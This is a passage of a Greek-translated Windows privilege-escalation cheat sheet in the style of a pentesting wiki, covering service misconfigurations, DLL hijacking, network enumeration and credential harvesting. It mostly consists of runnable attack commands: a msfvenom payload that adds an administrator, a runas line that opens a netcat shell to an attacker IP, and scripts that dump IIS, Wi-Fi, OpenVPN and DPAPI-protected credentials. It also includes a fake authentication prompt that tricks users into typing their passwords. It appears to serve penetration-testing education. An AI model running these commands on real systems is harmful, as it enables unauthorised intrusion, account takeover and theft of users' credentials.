[appenddata-addsubdirectory-permission-over-service-registry.md](appenddata-addsubdirectory-permission-over-service-registry.md)
{% endcontent-ref %}

### Μη αναφερόμενες διαδρομές υπηρεσιών

Αν η διαδρομή προς ένα εκτελέσιμο δεν είναι μέσα σε εισαγωγικά, τα Windows θα προσπαθήσουν να εκτελέσουν κάθε τερματισμό πριν από ένα κενό.

Για παράδειγμα, για τη διαδρομή _C:\Program Files\Some Folder\Service.exe_ τα Windows θα προσπαθήσουν να εκτελέσουν:
```powershell
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Λίστα όλων των μη παρατεθειμένων διαδρομών υπηρεσιών, εξαιρώντας αυτές που ανήκουν σε ενσωματωμένες υπηρεσίες των Windows:
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```powershell
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```powershell
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Μπορείτε να ανιχνεύσετε και να εκμεταλλευτείτε** αυτήν την ευπάθεια με το metasploit: `exploit/windows/local/trusted\_service\_path` Μπορείτε να δημιουργήσετε χειροκίνητα ένα δυαδικό αρχείο υπηρεσίας με το metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Τα Windows επιτρέπουν στους χρήστες να καθορίσουν ενέργειες που θα ληφθούν εάν μια υπηρεσία αποτύχει. Αυτή η δυνατότητα μπορεί να ρυθμιστεί ώστε να δείχνει σε ένα δυαδικό αρχείο. Εάν αυτό το δυαδικό αρχείο είναι αντικαταστάσιμο, μπορεί να είναι δυνατή η κλιμάκωση δικαιωμάτων. Περισσότερες λεπτομέρειες μπορούν να βρεθούν στην [επίσημη τεκμηρίωση](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662\(v=ws.11\)?redirectedfrom=MSDN).

## Applications

### Installed Applications

Ελέγξτε **τα δικαιώματα των δυαδικών αρχείων** (ίσως μπορείτε να αντικαταστήσετε ένα και να κλιμακώσετε τα δικαιώματα) και των **φακέλων** ([DLL Hijacking](dll-hijacking/)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Δικαιώματα Εγγραφής

Ελέγξτε αν μπορείτε να τροποποιήσετε κάποιο αρχείο ρυθμίσεων για να διαβάσετε κάποιο ειδικό αρχείο ή αν μπορείτε να τροποποιήσετε κάποιο δυαδικό αρχείο που πρόκειται να εκτελεστεί από έναν λογαριασμό Διαχειριστή (schedtasks).

Ένας τρόπος για να βρείτε αδύναμα δικαιώματα φακέλων/αρχείων στο σύστημα είναι να κάνετε:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Run at startup

**Ελέγξτε αν μπορείτε να αντικαταστήσετε κάποιο μητρώο ή δυαδικό αρχείο που πρόκειται να εκτελεστεί από διαφορετικό χρήστη.**\
**Διαβάστε** την **παρακάτω σελίδα** για να μάθετε περισσότερα σχετικά με ενδιαφέροντα **σημεία autoruns για την κλιμάκωση δικαιωμάτων**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Drivers

Αναζητήστε πιθανούς **τρίτους παράξενους/ευάλωτους** οδηγούς
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
## PATH DLL Hijacking

Αν έχετε **δικαιώματα εγγραφής μέσα σε έναν φάκελο που είναι παρών στο PATH** θα μπορούσατε να είστε σε θέση να υποκλέψετε μια DLL που φορτώνεται από μια διαδικασία και **να κλιμακώσετε τα δικαιώματα**.

Ελέγξτε τα δικαιώματα όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτόν τον έλεγχο:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Δίκτυο

### Κοινές Χρήσεις
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που είναι σκληρά κωδικοποιημένοι στο αρχείο hosts
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές Δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές Θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας Δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Τείχους Προστασίας

[**Ελέγξτε αυτή τη σελίδα για εντολές σχετικές με το Τείχος Προστασίας**](../basic-cmd-for-pentesters.md#firewall) **(λίστα κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για την αναγνώριση δικτύου εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το δυαδικό `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσεις δικαιώματα root, μπορείς να ακούσεις σε οποιαδήποτε θύρα (την πρώτη φορά που θα χρησιμοποιήσεις το `nc.exe` για να ακούσεις σε μια θύρα, θα ρωτήσει μέσω GUI αν πρέπει να επιτραπεί το `nc` από το τείχος προστασίας).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

Από [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Το Windows Vault αποθηκεύει τα διαπιστευτήρια χρηστών για διακομιστές, ιστοσελίδες και άλλα προγράμματα που **Windows** μπορεί να **συνδέσει τους χρήστες αυτόματα**. Στην πρώτη περίπτωση, αυτό μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν τα διαπιστευτήρια τους για το Facebook, τα διαπιστευτήρια του Twitter, τα διαπιστευτήρια του Gmail κ.λπ., έτσι ώστε να συνδέονται αυτόματα μέσω των προγραμμάτων περιήγησης. Αλλά δεν είναι έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια που το Windows μπορεί να συνδέσει τους χρήστες αυτόματα, που σημαίνει ότι οποιαδήποτε **εφαρμογή Windows που χρειάζεται διαπιστευτήρια για να αποκτήσει πρόσβαση σε μια πηγή** (διακομιστής ή ιστοσελίδα) **μπορεί να χρησιμοποιήσει αυτόν τον Credential Manager** & Windows Vault και να χρησιμοποιήσει τα διαπιστευτήρια που παρέχονται αντί να εισάγουν οι χρήστες το όνομα χρήστη και τον κωδικό πρόσβασης όλη την ώρα.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με τον Credential Manager, δεν νομίζω ότι είναι δυνατόν να χρησιμοποιήσουν τα διαπιστευτήρια για μια δεδομένη πηγή. Έτσι, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει κάπως **να επικοινωνήσει με τον credential manager και να ζητήσει τα διαπιστευτήρια για αυτή την πηγή** από το προεπιλεγμένο αποθηκευτικό vault.

Χρησιμοποιήστε το `cmdkey` για να καταγράψετε τα αποθηκευμένα διαπιστευτήρια στη μηχανή.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Τότε μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` προκειμένου να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το παρακάτω παράδειγμα καλεί ένα απομακρυσμένο δυαδικό μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρησιμοποιώντας το `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι το mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), ή από το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

Η **API Προστασίας Δεδομένων (DPAPI)** παρέχει μια μέθοδο για συμμετρική κρυπτογράφηση δεδομένων, κυρίως χρησιμοποιούμενη μέσα στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση εκμεταλλεύεται ένα μυστικό χρήστη ή συστήματος για να συμβάλλει σημαντικά στην εντροπία.

**Η DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προέρχεται από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που περιλαμβάνουν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά αυθεντικοποίησης του τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA χρηστών, χρησιμοποιώντας την DPAPI, αποθηκεύονται στον φάκελο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει τον [Αναγνωριστή Ασφαλείας](https://en.wikipedia.org/wiki/Security\_Identifier) του χρήστη. **Το κλειδί DPAPI, που βρίσκεται μαζί με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, συνήθως αποτελείται από 64 byte τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον φάκελο είναι περιορισμένη, αποτρέποντας την καταγραφή του περιεχομένου του μέσω της εντολής `dir` στο CMD, αν και μπορεί να καταγραφεί μέσω του PowerShell).
```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα επιχειρήματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως σε:
```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για να αποκρυπτογραφήσετε.\
Μπορείτε να **εξάγετε πολλές DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **σενάρια** και αυτοματοποιημένες εργασίες ως τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων με ευκολία. Τα διαπιστευτήρια προστατεύονται χρησιμοποιώντας **DPAPI**, που σημαίνει συνήθως ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή στον οποίο δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** ένα PS διαπιστευτήριο από το αρχείο που το περιέχει, μπορείτε να κάνετε:
```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες Συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Πρόσφατα Εκτελεσμένες Εντολές
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής Διαπιστευτηρίων Απομακρυσμένης Επιφάνειας Εργασίας**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το **Mimikatz** `dpapi::rdg` module με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε .rdg αρχεία**\
Μπορείτε να **εξάγετε πολλές DPAPI masterkeys** από τη μνήμη με το Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

Οι άνθρωποι συχνά χρησιμοποιούν την εφαρμογή StickyNotes σε σταθμούς εργασίας Windows για να **αποθηκεύσουν κωδικούς πρόσβασης** και άλλες πληροφορίες, χωρίς να συνειδητοποιούν ότι είναι ένα αρχείο βάσης δεδομένων. Αυτό το αρχείο βρίσκεται στο `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να το αναζητήσετε και να το εξετάσετε.

### AppCmd.exe

**Σημειώστε ότι για να ανακτήσετε κωδικούς πρόσβασης από το AppCmd.exe πρέπει να είστε Διαχειριστής και να εκτελείτε υπό υψηλό επίπεδο ακεραιότητας.**\
**AppCmd.exe** βρίσκεται στον φάκελο `%systemroot%\system32\inetsrv\`.\
Εάν αυτό το αρχείο υπάρχει, τότε είναι πιθανό ότι έχουν ρυθμιστεί κάποια **credentials** και μπορούν να **ανακτηθούν**.

Αυτός ο κώδικας εξήχθη από [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι εγκαταστάτες **εκτελούνται με δικαιώματα SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Μητρώο (Διαπιστευτήρια)

### Διαπιστευτήρια Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά Φιλοξενίας SSH Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκευτούν μέσα στο κλειδί μητρώου `HKCU\Software\OpenSSH\Agent\Keys`, οπότε θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε είσοδο μέσα σε αυτή τη διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο κλειδί SSH. Αποθηκεύεται κρυπτογραφημένο αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Περισσότερες πληροφορίες σχετικά με αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
{% hint style="info" %}
Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω κάποια ssh κλειδιά, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε μια μηχανή. Η καταχώρηση HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά τη διάρκεια της ασύμμετρης αυθεντικοποίησης κλειδιού.
{% endhint %}

### Ανεπίβλεπτα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας **metasploit**: _post/windows/gather/enum\_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM αντίγραφα ασφαλείας
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Πιστοποιήσεις Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο που ονομάζεται **SiteList.xml**

### Cached GPP Pasword

Μια δυνατότητα ήταν προηγουμένως διαθέσιμη που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω των Προτιμήσεων Πολιτικής Ομάδας (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Αντικείμενα Πολιτικής Ομάδας (GPOs), που αποθηκεύονται ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε χρήστη τομέα. Δεύτερον, οι κωδικοί πρόσβασης μέσα σε αυτά τα GPPs, κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημόσια τεκμηριωμένο προεπιλεγμένο κλειδί, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε πιστοποιημένο χρήστη. Αυτό συνιστούσε σοβαρό κίνδυνο, καθώς θα μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν ανυψωμένα δικαιώματα.

Για να μετριαστεί αυτός ο κίνδυνος, αναπτύχθηκε μια λειτουργία για να σαρώσει τα τοπικά κρυπτογραφημένα αρχεία GPP που περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Όταν βρεθεί ένα τέτοιο αρχείο, η λειτουργία αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Αυτό το αντικείμενο περιλαμβάνει λεπτομέρειες σχετικά με το GPP και την τοποθεσία του αρχείου, βοηθώντας στην αναγνώριση και αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (προτού το W Vista)_ για αυτά τα αρχεία:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρησιμοποιώντας το crackmapexec για να αποκτήσετε τους κωδικούς πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα του web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ask for credentials

You can always **ask the user to enter his credentials of even the credentials of a different user** if you think he can know them (notice that **asking** the client directly for the **credentials** is really **risky**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
